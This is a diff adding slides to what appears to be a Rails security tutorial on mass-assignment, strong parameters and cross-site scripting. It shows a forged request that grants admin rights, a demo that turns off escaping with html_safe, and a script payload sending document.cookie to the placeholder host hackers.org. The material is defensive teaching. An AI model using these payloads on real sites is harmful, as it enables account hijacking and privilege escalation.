@@ -327,17 +327,112 @@ And that's it! If you are wondering where the key that the cookies are being sig
 
 # Mass-Assignment
 
+Another common type of security flaws in Rails applications is referred to as a Mass-Assignment vulnerability. You have seen places in the code where we assign values to multiple attributes at the same time like this:
+
+```ruby
+customer = Customer.new(name: 'Test', email: 'test@example.com')
+```
+
+Prior to Rails 4, it was common in a controller to pass in part of the parameters directly, like this:
+
+```ruby
+customer = Customer.new(params[:customer])
+```
+
+You would do this if you are expecting the `customer` Hash in `params` to contain something like this:
+
+```ruby
+{ name: 'Test', email: 'test@example.com' }
+```
+
+Let's say you have a boolean attribute called `admin` on `Customer` that you use to control if have admin rights in the application. You of course would not put a check box for this on the form the user sees, but this goes back the point we said earlier:
+
+## Never Trust User Input
+
+---
+
+# Mass-Assignment
+
+Just like we saw with cookies, parameters can be faked to. If a user submitted data like this:
+
+    .terminal
+    customer[name]=Hacker&customer[email]=hacker@example.com&customer[admin]=1
+
+Then the params Hash would look like this:
+
+```ruby
+{ name: 'Test', email: 'test@example.com', admin: 1 }
+```
+
+This would result in the user having admin privileges when they should not.
+
+So how do we prevent this?
+
+## Strong Parameters
+
+This was added to Rails 4 and we saw this in the earlier example of the `customer_params` in the `create` action of the `CustomerController`:
+
+```ruby
+params.require(:customer).permit(:name, :email)
+```
+
+What this means is that we require the params Hash to have a customer key, and that in that Hash, we allow it to have a name and email key, although if it doesn't have them, that is ok. If any of the required parameters or any non-permitted parameters are passed in, then an error is raised, which prevents the user from gaining access to things they should be able to.
+
 ---
 
 # Cross-Site Scripting
 
+Cross-Site Scripting (XSS) attacks are ones in which the attacker somehow adds code to a site so that they can gain access to data as any user who access the site. To see this in action, change the name of the first product to include a script tag:
+
+    .terminal
+    >> product = Product.first
+    >> product.update_attributes(name: "<script>alert('#{product.name}')</script>")
+
+Now if you load the products listing, you will see that HTML code printed as the name of that Product. If you take a look at the source of the page, if will look something like this:
+
+```html
+<a href="/products/1">&amp;lt;script&amp;gt;alert(&amp;#39;Hat&amp;#39;)&amp;lt;/script&amp;gt; - #1</a>
+```
+
+This is because Rails automatically escapes content for you. Let's ask Rails not to do that:
+
+```html
+<%= link_to product_title(product).html_safe, product_path(product) %>
+```
+
+Now we can see the page has the actual HTML unescaped:
+
+```html
+<a href="/products/1"><script>alert('Hat')</script> - #1</a>
+```
+
+And more importantly, the JavaScript code caused the browser to display an alert.
+
 ---
 
-# SQL Injection
+# Cross-Site Scripting
 
----
+This kind of code injection is dangerous when you have content that one user can post that all other can see. For example, imagine if you have a comments box on your site. A malicious user could post a commit with JavaScript code that would allow them to modify the contents of the page as it is displayed to other users. Also, they could capture the contents of cookies by other logged in users and then pass them to a remote server, which they could use to then log in as other users.
 
-# Cross-Site Request Forgery
+.small[
+```html
+<script>document.write('<img src="http://hackers.org?cookie="'+document.cookie+'/>')</script>
+```
+]
+
+As we can see, Rails protects us from this by default, because the code was escaped. There may be times when you want to bypass this protection, which you can do so as we did by using `.html_safe`
+
+```html
+<%= "I won't be escaped!".html_safe %>
+```
+
+You can also use the `raw` helper:
+
+```html
+<%= raw "I won't be escaped!" %>
+```
+
+Be careful if you do decide to do this that you are not opening yourself up to an XSS vulnerability.
 
   </textarea><div id="slideshow"></div>
   </body>
